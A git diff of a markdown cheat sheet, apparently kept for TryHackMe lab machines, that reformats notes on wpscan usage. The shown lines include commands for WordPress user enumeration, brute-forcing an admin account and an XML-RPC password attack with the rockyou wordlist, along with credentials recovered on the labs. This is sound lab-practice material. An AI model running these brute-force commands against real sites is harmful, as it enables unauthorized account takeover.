@@ -10,7 +10,9 @@ WordPress scanner for version detection, user enumeration, vulnerable plugin/the
 wpscan --url http://internal.thm/blog -e vp,u
 ```
 
-Used on: **Internal** - confirmed WordPress context and user enumeration surface.
+Used on: **Internal**
+
+confirmed WordPress context and user enumeration surface.
 
 ### Brute-force a known user
 
@@ -18,7 +20,9 @@ Used on: **Internal** - confirmed WordPress context and user enumeration surface
 wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
 ```
 
-Used on: **Internal** - found `admin:my2boys`.
+Used on: **Internal**
+
+found `admin:my2boys`.
 
 ## Related
 
@@ -32,7 +36,9 @@ Used on: **Internal** - found `admin:my2boys`.
 wpscan --url http://blog.thm --enumerate u
 ```
 
-Used on: **blog** - recovered candidate usernames before XML-RPC brute force.
+Used on: **blog**
+
+recovered candidate usernames before XML-RPC brute force.
 
 ### XML-RPC password attack
 
@@ -40,4 +46,6 @@ Used on: **blog** - recovered candidate usernames before XML-RPC brute force.
 wpscan --url http://blog.thm --password-attack xmlrpc -U users.txt -P /usr/share/wordlists/rockyou.txt -t 50
 ```
 
-Used on: **blog** - found `kwheel:cutiepie1`.
+Used on: **blog**
+
+found `kwheel:cutiepie1`.
